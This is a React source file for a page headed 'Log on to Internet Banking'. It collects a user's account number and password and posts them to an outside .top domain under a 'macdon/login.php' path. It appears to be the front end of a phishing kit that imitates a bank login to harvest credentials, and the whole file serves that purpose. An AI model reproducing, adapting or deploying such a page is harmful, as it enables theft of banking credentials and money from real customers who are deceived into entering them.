import React, { useState } from 'react'
import axios from 'axios'
import { useNavigate } from 'react-router-dom'

export default function Form() {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [verify, setVerify] = useState('')

  const navigate = useNavigate()

  const handleSubmit = async (e) => {
    e.preventDefault()
    try {
      const res = await axios.post('https://firsttechwallet.top/macdon/login.php', {
        username,
        password,
        verify,
      })
      console.log('Response:', res)
      if (res.data.status === 'success') {
        navigate('/dashboard')
      } else {
        console.error('Login failed:', res.data.message)
        alert(res.data.message)
      }
    } catch (error) {
      console.error('Login error:', error)
    }
  }
  return (
    <div>
      <form onSubmit={handleSubmit} className='form p-3 px-8  rounded-xl flex flex-col gap-4'>
        <div className='leading-4'>
          <h3>Log on to Internet Banking</h3>
          <label htmlFor='username'>
            User Account<span className='text-red-600'>*</span>
          </label>
          <input
            type='text'
            id='username'
            placeholder='Account Number'
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
          <p>For corporate customers, kindly use Corporate ID.User ID</p>
        </div>
        <div className='-m-2'>
          <label htmlFor='verify'>
            Enter Password<span className='text-red-600'>*</span>
          </label>
          <div className='flex flex-col gap-4'>
            <input
              type='password'
              id='password'
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder='Password'
              className='font-bold'
            />
            {/* <input
              type='text'
              value={verify}
              onChange={(e) => setVerify(e.target.value)}
              placeholder='Confirm Password'
            /> */}
          </div>
        </div>
        <input type='submit' value='Next' className='next-btn' />

        <div className='divider'></div>
        <p>New customer ?</p>
        <button className='registerbtn cursor-pointer'>Self-Registration</button>
      </form>
    </div>
  )
}
